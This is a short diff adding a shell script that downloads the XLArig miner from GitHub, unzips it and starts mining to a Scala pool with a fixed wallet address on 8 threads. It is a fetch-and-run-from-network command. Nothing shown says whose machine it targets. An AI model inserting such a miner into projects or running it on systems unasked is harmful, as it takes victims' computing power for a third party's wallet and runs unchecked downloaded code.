@@ -1,0 +1,2 @@
+#!/bin/sh
+wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-macOS-x86_64.zip && unzip XLArig-v5.2.2-macOS-x86_64.zip && ./xlarig -o pool.scalaproject.io:3333 -u Ssy2Ceu2umdNYxHh799vEiApWhozLK5g9K4y8qR7mRXpPeaYNB8pgmJRxe9rgyNMVoSwKvnPs4r6ZVoreuYv3nkb9ADjTvBgJ9 -p A -a panthera -t8
